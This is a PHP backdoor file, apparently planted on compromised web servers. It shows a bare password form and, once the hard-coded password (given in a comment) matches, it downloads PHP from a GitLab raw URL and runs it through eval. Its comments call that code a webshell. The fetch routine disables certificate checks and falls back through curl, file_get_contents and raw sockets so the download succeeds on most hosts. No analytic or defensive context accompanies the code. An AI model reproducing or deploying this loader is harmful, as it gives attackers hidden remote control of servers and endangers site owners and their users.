<?php
session_start();

function getURL($url) {
    $parsed_url = parse_url($url);
    $host = $parsed_url['host'];
    $path = isset($parsed_url['path']) ? $parsed_url['path'] : '/';
    $port = isset($parsed_url['port']) ? $parsed_url['port'] : (isset($parsed_url['scheme']) && $parsed_url['scheme'] === 'https' ? 443 : 80);
    $scheme = isset($parsed_url['scheme']) && $parsed_url['scheme'] === 'https' ? 'ssl://' : '';

    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    elseif (function_exists('file_get_contents')) {
        $context = stream_context_create([
            'http' => [
                'method' => 'GET',
                'header' => "User-Agent: PHP\r\n"
            ]
        ]);
        return file_get_contents($url, false, $context);
    }
    elseif (function_exists('stream_socket_client')) {
        $socket = @stream_socket_client($scheme . $host . ':' . $port, $errno, $errstr);
        if (!$socket) {
            return false;
        }
        $request = "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: PHP\r\nConnection: close\r\n\r\n";
        fwrite($socket, $request);
        $response = '';
        while (!feof($socket)) {
            $response .= fgets($socket);
        }
        fclose($socket);
        $body = substr($response, strpos($response, "\r\n\r\n") + 4);
        return $body;
    }
    elseif (function_exists('fsockopen')) {
        $socket = @fsockopen($scheme . $host, $port, $errno, $errstr);
        if (!$socket) {
            return false;
        }
        $request = "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: PHP\r\nConnection: close\r\n\r\n";
        fwrite($socket, $request);
        $response = '';
        while (!feof($socket)) {
            $response .= fgets($socket);
        }
        fclose($socket);
        $body = substr($response, strpos($response, "\r\n\r\n") + 4);
        return $body;
    }
    else {
        return false;
    }
}

function generate_csrf_token() {
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

function login_shell() {
    $password_hash = "1a84b8ba094c0c89954e86f2f518a9f32513da9b47b3619f1fba6c10fde783f2"; // SHA256 hash of "KOBERSERVER#"

    // Check if user is already authenticated
    if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
        // Execute webshell directly
        eval("?>" . getURL("https://gitlab.com/nothing-imposible/posible/-/raw/main/alertshower.php"));
        exit;
    }

    if (isset($_POST['password']) && isset($_POST['csrf_token'])) {
        // Verify CSRF token
        if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
            echo "<script>alert('Invalid CSRF token!');</script>";
            return;
        }

        // Sanitize input to prevent XSS
        $input_password = htmlspecialchars($_POST['password'], ENT_QUOTES, 'UTF-8');
        // Hash the input password with SHA256
        $input_password_hash = hash('sha256', $input_password);

        if ($input_password_hash === $password_hash) {
            // Password correct, set session and execute webshell
            $_SESSION['authenticated'] = true;
            eval("?>" . getURL("https://gitlab.com/nothing-imposible/posible/-/raw/main/alertshower.php"));
            exit;
        } else {
            // Incorrect password, trigger popup
            echo "<script>alert('Access Denied');</script>";
        }
    }

    // Generate CSRF token for the form
    $csrf_token = generate_csrf_token();
?>
<!DOCTYPE HTML>
<html>
<head>

<style type="text/css">
html, body {
    margin: 0;
    padding: 0;
    height: 100%;
    background: #000000;
    color: red;
    display: flex;
    justify-content: center;
    align-items: center;
    text-align: center;
}
.container {
    display: flex;
    flex-direction: column;
    align-items: center;
}
header {
    color: red;
    margin: 10px 0;
}
input[type=password] {
    width: 250px;
    height: 25px;
    color: red;
    background: transparent;
    border: 1px dotted red;
    text-align: center;
}
</style>
</head>
<body>
<div class="container">
<form method="post">
<input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($csrf_token, ENT_QUOTES, 'UTF-8'); ?>">
<input type="password" name="password" autofocus>
</form>
</div>
</body>
</html>
<?php
}

login_shell();
?>
